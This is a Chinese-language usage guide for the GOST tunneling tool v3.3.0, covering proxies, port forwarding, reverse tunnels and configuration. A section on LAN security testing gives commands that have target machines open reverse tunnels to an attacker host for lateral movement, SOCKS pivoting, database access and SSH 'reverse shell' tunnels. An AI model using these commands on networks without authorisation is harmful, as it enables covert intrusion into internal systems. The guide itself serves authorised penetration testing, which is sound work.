# GOST (GO Simple Tunnel) 本地使用指南

## 📦 版本信息
- **版本**: v3.3.0
- **架构**: Windows AMD64
- **下载时间**: 2026-09-19
- **来源**: https://github.com/go-gost/gost/releases/tag/v3.3.0

## 🚀 快速开始

### 1. 基础代理服务 (SOCKS5 + HTTP)
```powershell
# 启动监听 8080 端口，同时提供 SOCKS5 和 HTTP 代理
.\gost.exe -L :8080

# 指定代理类型
.\gost.exe -L socks5://:1080          # 仅 SOCKS5
.\gost.exe -L http://:8080            # 仅 HTTP
.\gost.exe -L socks5://user:pass@:1080 # 带认证
```

### 2. 端口转发 (本地转发)
```powershell
# 本地 8080 转发到目标 192.168.1.100:3389 (RDP)
.\gost.exe -L :8080/192.168.1.100:3389

# 多端口转发
.\gost.exe -L :8080/192.168.1.100:80 -L :3389/192.168.1.100:3389
```

### 3. 反向代理 / 内网穿透 (核心功能)

#### 场景：受控端在内网，控制端在公网/另一内网

**控制端 (公网/有公网IP机器):**
```powershell
# 监听 443 接收隧道连接，并暴露本地 8080 供访问
.\gost.exe -L relay+wss://:443/:8080
```

**受控端 (内网目标机器):**
```powershell
# 连接控制端，将内网 3389 映射出去
.\gost.exe -L :3389 -F relay+wss://控制端公网IP:443
```

**验证：** 在控制端访问 `localhost:8080` 即访问受控端的 3389

### 4. 代理链 (多级跳板)
```powershell
# 本地 -> 跳板1 -> 跳板2 -> 目标
.\gost.exe -L :8080 -F socks5://跳板1IP:1080 -F socks5://跳板2IP:1080

# 或使用配置文件 (推荐复杂链路)
```

### 5. TLS/WS/WSS 加密隧道
```powershell
# 生成自签名证书
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"

# 服务端 (WSS)
.\gost.exe -L wss://:443?cert=cert.pem&key=key.pem

# 客户端
.\gost.exe -L :8080 -F wss://服务端IP:443?insecure=true
```

## ⚙️ 配置文件模式 (推荐生产/复杂场景)

创建 `gost.yml`：
```yaml
services:
  - name: proxy
    addr: ":8080"
    handler:
      type: auto
    listener:
      type: tcp
    forwarder:
      nodes:
        - name: target
          addr: "192.168.1.100:3389"
  - name: tunnel
    addr: "relay+wss://:443/:8080"
    handler:
      type: relay
    listener:
      type: wss
```

启动：
```powershell
.\gost.exe -C gost.yml
```

## 🎯 局域网安全测试常用场景

### 场景 1：横向移动 - 访问内网非公开端口
```powershell
# 目标机器 (192.168.1.50) 执行：
.\gost.exe -L :8080 -F relay+wss://192.168.1.100:443

# 攻击机 (192.168.1.100) 执行：
.\gost.exe -L relay+wss://:443/:8080

# 攻击机访问 http://localhost:8080 即访问目标机器内网服务
```

### 场景 2：Socks5 代理穿透
```powershell
# 目标机器开启 SOCKS5 并反向连接
.\gost.exe -L socks5://:1080 -F relay+wss://攻击机IP:443

# 攻击机监听
.\gost.exe -L relay+wss://:443/1080

# 攻击机配置浏览器/工具代理：socks5://127.0.0.1:1080
```

### 场景 3：数据库/管理面板访问
```powershell
# 目标机器 (内网数据库 1433)
.\gost.exe -L :1433 -F relay+wss://攻击机IP:443

# 攻击机
.\gost.exe -L relay+wss://:443/:1433

# 攻击机用 SSMS 连接 127.0.0.1:1433
```

### 场景 4：反向 Shell 隧道
```powershell
# 目标机器
.\gost.exe -L :22 -F relay+wss://攻击机IP:443

# 攻击机
.\gost.exe -L relay+wss://:443/:2222

# 攻击机 SSH 连接：ssh user@127.0.0.1 -p 2222
```

## 📋 常用参数速查

| 参数 | 说明 |
|------|------|
| `-L` | 监听地址 (listen) |
| `-F` | 转发地址 (forward) |
| `-C` | 配置文件路径 |
| `-V` | 显示版本 |
| `-D` | 调试模式 |
| `-log` | 日志输出文件 |

## 🔗 协议支持

| 协议 | 前缀 | 说明 |
|------|------|------|
| TCP | `tcp://` | 原始 TCP |
| HTTP | `http://` | HTTP 代理 |
| SOCKS4/5 | `socks5://` | SOCKS 代理 |
| TLS | `tls://` | TLS 加密 |
| WebSocket | `ws://` | WS 隧道 |
| WSS | `wss://` | WSS 加密隧道 |
| QUIC | `quic://` | QUIC 协议 |
| KCP | `kcp://` | KCP 协议 |
| SSH | `ssh://` | SSH 隧道 |
| Relay | `relay://` | GOST 专用中继 |

## 📚 官方资源
- **官网文档**: https://gost.run
- **GitHub**: https://github.com/go-gost/gost
- **配置参考**: https://gost.run/docs/configuration/
- **Telegram**: https://t.me/gogost

## ⚠️ 法律声明
**仅限授权网络环境下的安全测试研究使用。未经授权的网络渗透、数据窃取等行为违反《中华人民共和国网络安全法》等法律法规，后果自负。**

---

*生成时间: 2026-09-19 | 工具版本: gost v3.3.0*